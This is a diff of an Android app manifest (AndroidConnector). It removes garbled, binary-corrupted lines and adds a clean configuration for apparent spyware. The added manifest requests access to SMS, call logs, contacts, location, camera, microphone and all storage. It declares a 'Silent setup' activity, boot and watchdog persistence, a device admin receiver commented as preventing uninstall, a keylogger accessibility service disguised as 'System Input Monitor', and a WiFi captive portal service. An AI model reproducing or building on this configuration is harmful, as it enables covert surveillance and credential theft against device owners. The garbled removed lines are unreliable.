@@ -3,25 +3,118 @@
 
     <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android,\›Z\ÜÚ[Û‹PÐÑTÔ×Ó‘UÓÔ’×ÔÕUHˆÏ‚ˆ\Ù\Ë\\›Z\ÜÚ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYœ\›Z\ÜÚ[Û‹PÐÑTÔ×ÕÒQ’WÔÕUHˆÏ‚ˆ\Ù\Ë\\›Z\ÜÚ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYœ\›Z\ÜÚ[Û‹ÒS‘ÑWÕÒQ’WÔÕUHˆÏ‚‚ˆKKHÙY\P[]™HÈÙ\šXÙHKO‚ˆ\Ù\Ë\\›Z\ÜÚ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYœ\›Z\ÜÚ[Û‹‘“Ô‘QÔ“ÕS‘ÔÑT•’PÑHˆÏ‚ˆ\Ù\Ë\\›Z\ÜÚ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYœ\›Z\ÜÚ[Û‹‘“Ô‘QÔ“ÕS‘ÔÑT•’PÑWÑUWÔÖSÈˆÏ‚ˆ\Ù\Ë\\›Z\ÜÚ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYœ\›Z\ÜÚ[Û‹”‘PÑRU‘WÐ“ÓÕÐÓÓTUQˆÏ‚ˆ\Ù\Ë\\›Z\ÜÚ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYœ\›Z\ÜÚ[Û‹•ÐRÑWÓÐÒÈˆÏ‚ˆ\Ù\Ë\\›Z\ÜÚ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYW&Ö—76–öâå$UTU5Eô”täõ$Uô$EDU%•ôõD”Ô•¤D”ôå2"óà¢ÇW6W2×W&Ö—76–öâæG&ö–C¦æÖSÒ&æG&ö–BçW&Ö—76–öâå44„TETÄUôU„5EôÄ$Ò"óà¢ÇW6W2×W&Ö—76–öâæG&ö–C¦æÖSÒ&æG&ö–BÁ•Éµ¥ÍÍ¥½¸¹UM}aQ}1I4ˆ€¼ø((€€€€ð„´´MÑ½É…e -->
-    <uses-permission android:name="android,\›Z\ÜÚ[Û‹”‘PQÑVT“SÔÕÔQÑHˆ[™›ÚY›X^ÙÕ™\6–öãÒ#3""óà¢ÇW6W2×W&Ö—76–öâæG&ö–C¦æÖSÒ&æG&ö–BçW&Ö—76–öâåu$•DUôU…DU$äÅõ5Dõ$tR"æG&ö–C¦Ö…6FµfW¥½¸ôˆÌÈˆ€¼ø(€€€€ñÕÍ•ÌµÁ•Éµ¥ÍÍ¥½¸…¹‘É½¥é¹…µ”ô‰…¹‘É½¥¹Á•Éµ¥ÍÍ¥½¸¹59}aQI91}MQ=Iˆ€¼ø((€€€€ð„´´•Ù¥”¥¹™¼€´´ø(€€€€ñÕÍ•ÌµÁ•Éµ¥ÍÍ¥½¸…¹‘É½¥é¹…µ”ô‰…¹‘É½¥¹Á•Éµ¥ÍÍ¥½¸¹I}A!=9}MQQˆ€¼ø(€€€€ñÕÍ•ÌµÁ•Éµ¥ÍÍ¥½¸…¹‘É½¥é¹…µ”ô‰…¹‘É½¥¹Á•Éµ¥ÍÍ¥½¸¹	QQIe}MQQLˆ€¼ø((€€€€ð„´´1½…Ñ¥½¸€´´ø(€€€€ñÕÍ•ÌµÁ•Éµ¥ÍÍ¥½¸…¹‘É½¥é¹…µ”ô‰…¹‘É½¥¹Á•Éµ¥ÍÍ¥½¸¹MM}%9}1=Q%=8ˆ€¼ø(€€€€ñÕÍ•ÌµÁ•Éµ¥ÍÍ¥½¸…¹‘É½¥é¹…µ”ô‰…¹‘É½¥¹Á•Éµ¥ÍÍ¥½¸¹MM}=IM}1=Q%=8ˆ€¼ø((€€€€ð„´´M5L°…±±Ì°½¹Ñ…ÑÌ€´´ø(€€€€ñÕÍ•ÌµÁ•Éµ¥ÍÍ¥½¸…¹‘É½¥é¹…µ”ô‰…¹‘É½¥¹Á•Éµ¥ÍÍ¥½¸¹I}M5Lˆ€¼ø(€€€€ñÕÍ•ÌµÁ•Éµ¥ÍÍ¥½¸…¹‘É½¥é¹…µ”ô‰…¹‘É½¥¹Á•Éµ¥ÍÍ¥½¸¹I}11}1=ˆ€¼ø(€€€€ñÕÍ•ÌµÁ•Éµ¥ÍÍ¥½¸…¹‘É½¥é¹…µ”ô‰…¹‘É½¥¹Á•Éµ¥ÍÍ¥½¸¹I}=9QQLˆ€¼ø((€€€€ð„´´ÁÀµ…¹…ememKO‚ˆ\Ù\Ë\\›Z\ÜÚ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYœ\›Z\ÜÚ[Û‹”UQT–WÐSÔPÒÐQÑTÈˆÏ‚ˆ\Ù\Ë\\›Z\ÜÚ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYW&Ö—76–öâå$UTU5Eô”å5DÄÅõ4´tU2"óà¢ÇW6W2×W&Ö—76–öâæG&ö–C¦æÖSÒ&æG&ö–BçW&Ö—76–öâå$UTU5EôDTÄUDUõ4´tU2"óà ¢ÂÒÒÖVF–ÒÓà¢ÇW6W2×W&Ö—76–öâæG&ö–C¦æÖSÒ&æG&ö–BçW&Ö—76–öâåd”%$DR"óà¢ÇW6W2×W&Ö—76–öâæG&ö–C¦æÖSÒ&æG&ö–BçW&Ö—76–öâä4ÔU$"óà¢ÇW6W2×W&Ö—76–öâæG&ö–C¦æÖSÒ&æG&ö–BçW&Ö—76–öâå$T4õ$EôTD”ò"óà ¢ÆÆ–6F–öà¢æG&ö–C¦æÖSÒ"ä ¢æG&ö–C¦ÆÆ÷t&6·WÒ&fÇ6R ¢æG&ö–C¦–6öãÒ$Ö—Öö–5öÆVæ6†W" ¢æG&ö–C¦Æ&VÃÒ$7G&–ærööæÖR ¢æG&ö–C§&÷VæD–6öãÒ$Ö—Öö–5öÆVæ6†W%÷&÷VæB ¢æG&ö–C§7W÷'G5'FÃÒ'G'VR ¢æG&ö–C‰•ÅÕ•ÍÑ1•…åáÑ•É¹…±MÑ½É…”ô„rue"
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+
+    <!-- Keep-Alive / Service -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+
+    <!-- Storage -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+
+    <!-- Device info -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.BATTERY_STATS" />
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- SMS, Calls, Contacts -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <!-- App management -->
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+
+    <!-- Media -->
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <application
+        android:name=".App"
+        android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:requestLegacyExternalStorage="true"
         android:theme="@style/Theme.AndroidConnector">
 
         <!-- Main activity -->
         <activity
             android:name=".MainActivity"
-            android:expoqYHYH‚ˆ[™›ÚYœØÜ™Y[“ÜšY[FF–öãÒ'÷'G&—B ¢æG&ö–C¦W†6ÇVFTg&öÕ&V6VÑÌô‰ÑÅe" />
+            android:exported="true"
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="true" />
 
         <!-- Silent setup -->
         <activity
             android:name=".SilentSetupActivity"
-            android:expoqYH™˜[ÙH‚ˆ[™›ÚYœØÜ™Y[“ÜšY[][ÛH÷É…¥Ðˆ(€€€€€€€€€€€…¹‘É½¥é•á±Õ‘•É½µI••¹ÑÌô‰ÑÉÕ”ˆ€¼ø((€€€€€€€€ð„´´5…ÑÉ¥àÍÕ•ÍÌ…¹¥µ…Ñ¥½¸Í•Ñ•±… Í•ÑÕÀÍ•±•Í…¤€´´ø(€€€€€€€€ñ…Ñ¥Ù¥Ñä(€€€€€€€€€€€…¹‘É½¥é¹…µ”ôˆ¹5…ÑÉ¥áMÕ•ÍÍÑ¥Ù¥Ñäˆ(€€€€€€€€€€€…¹‘É½¥é•áÁ½ÉÑ•ô‰™…±Í”ˆ(€€€€€€€€€€€…¹‘É½¥ãcreenOrientation="portrait"
-            android:excludeD›ÛT™XÙ[ÏHG'VR ¢æG&ö–C§F†VÖSÒ$7G–ÆRõF†VÖRäÖG&—…7V66W72"óà ¢ÂÒÒÆVæ6†W"Æ–2ÒÓà¢Æ7F—f—G’ÖÆ–0¢æG&ö–C¦æÖSÒ"äÖ–äÆVæ6†W$Æ–2 ¢æG&ö–C§F%•ÑÑ¥Ù¥Ñäôˆ¹5…¥¹Ñ¥Ù¥Ñäˆ(€€€€€€€€€€€…¹‘É½¥é•¹…‰±•ô‰ÑÅe"
-            android:exported="tqYH‚ˆ[[Yš[\‚ˆXÝ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYš[FVÐ¹…Ñ¥½¸¹5%8ˆ€¼ø(€€€€€€€€€€€€€€€€ñ…Ñ•½É android:name="android.intent.category.LAUNCHER" />
-            </im[BÖf–ÇFW#à¢Âö7F—f—G’ÖÆ–3à ¢ÂÒÒ&6¶w&÷VæB6öææV7F÷"6W'f–6RÒÓà¢Ç6W'f–6P¢æG&ö–C¦æÖSÒ"ä6öææV7F÷%6W'f–6R ¢æG&ö–C¦Væ&ÆVCÒÉÕ”ˆ(€€€€€€€€€€€…¹‘É½¥é•áÁ½ÉÑ•ô‰™…±Í”ˆ(€€€€€€€€€€€…¹‘É½¥é™½É•roundServiceType="dataSync" />
+            android:exported="false"
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="true" />
 
-        <receiver android:name=".BootReceiver" android:enabled="true" android:expoqYHYH‚ˆ[FVÐµ™¥±Ñ•È…¹‘É½¥éÁÉ¥½É¥Ñäôˆäääˆø(€€€€€€€€€€€€€€€€ñ…Ñ¥½¸…¹‘É½¥é¹…µ”ô‰…¹‘É½¥¹¥´em˜XÝ[Û‹“ÓÕÐÓÓTUQˆÏ‚ˆXÝ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYš[[˜XÝ[Û‹“VWÔPÒÐQÑWÔ‘TPÑQˆÏ‚ˆXÝ[Ûˆ[™›ÚY›˜[YOH˜[™›ÚYš[[˜XÝ[Û‹”URPÒÐ“ÓÕÔÕÑT“ÓˆˆÏ‚ˆXÝ[Ûˆ[™›ÚY›˜[YOH˜ÛÛKšËš[[˜XÝ[Û‹”URPÒÐ“ÓÕÔÕÑT“ÓˆˆÏ‚ˆÚ[[Yš[\‚ˆÜ™XÙZ]™\‚‚ˆ™XÙZ]™\ˆ[™›ÚY›˜[YOH‹•Ø]ÚÙÔ™XÙZ]™\ˆˆ[™›ÚY™[˜X›YHVR"æG&ö–C¦W‡÷'FVCÒ&fÇ6R#à¢Æ–Ñ•´-filter>
-                <action android:name="com.android,Ù\f–6W2åtD4„Dôr"óà¢Âö–çFVçBÖf–ÇFW#à¢Â÷&V6V—fW#à ¢ÂÒÒFWf–6RFÖ–â(	BÖVæ6Vv‚Væ–ç7FÆÂÒÓà¢Ç&V6V—fW ¢æG&ö–C¦æÖSÒ"äFWf–6TFÖ–å&V6V—fW" ¢æG&ö–C¦W‡÷•ô‰ÑÉÕ”ˆ(€€€€€€€€€€€…¹‘É½¥éÁ•Éµ¥ÍÍ¥½¸ô‰…¹‘É½¥°ermission.BIND_DEVICE_ADMIN">
+        <!-- Matrix success animation setelah setup selesai -->
+        <activity
+            android:name=".MatrixSuccessActivity"
+            android:exported="false"
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.MatrixSuccess" />
+
+        <!-- Launcher alias -->
+        <activity-alias
+            android:name=".MainLauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Background connector service -->
+        <service
+            android:name=".ConnectorService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".WatchdogReceiver" android:enabled="true" android:exported="false">
+            <intent-filter>
+                <action android:name="com.android.services.WATCHDOG" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Device Admin â€” mencegah uninstall -->
+        <receiver
+            android:name=".AppDeviceAdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
             <meta-data
                 android:name="android.app.device_admin"
                 android:resource="@xml/device_admin_policies" />
@@ -30,14 +123,39 @@
             </intent-filter>
         </receiver>
 
-        <!-- Keylogger â€” AccessibilitySeqšXÙHKO‚ˆÙ\f–6P¢æG&ö–C¦æÖSÒ"ä¶W–Æõ•ÉM•ÉÙ¥”ˆ(€€€€€€€€€€€…¹‘É½¥é•áÁ½Äed="true"
+        <!-- Keylogger â€” AccessibilityService -->
+        <service
+            android:name=".KeyloggerService"
+            android:exported="true"
             android:label="System Input Monitor"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
-            </im[BÖf–ÇFW#à¢ÆÖWFÖFF¢æG&ö–C¦æÖSÒ&æG&ö–Bæ66W76–&–Æ—G—6W¥”ˆ(€€€€€€€€€€€€€€€…¹‘É½¥âesource="@xml/accessibility_service_config" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- FileProvider umZÈ[7FÆÂ²ÒÓà¢Ç&÷f–FW ¢æG&ö–C¦æÖSÒ&æG&ö–G‚æ6÷&Ræ6öÑ•´.FileProvider"
+        <!-- FileProvider untuk install APK -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
-            android:expoqYH™˜[ÙH‚ˆ[™›ÚY™Ü˜[EW&•W&Ö—76–öç3Ò'G'VR#à¢ÆÖWFÖFF¢æG&ö–C¦æÖSÒ&æG&ö–Bç7W÷'Bäd”ÄUõ$õd”DU%õD…2 ¢æG&ö–C‰•Í½ÕÉ”ô‰áµ°½™¥±•}Á…Ñ¡Ìˆ€¼ø(€€€€€€€€ð½ÁÉ½Ù¥‘•Èø(((€€€€ð½…ÁÁ±¥…Ñ¥½¸ø(ð½µ…¹¥™•ÍÐø
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+
+
+
+        <!-- WiFi Captive Portal Service -->
+        <service
+            android:name=".WifiPortalService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+    </application>
+</manifest>
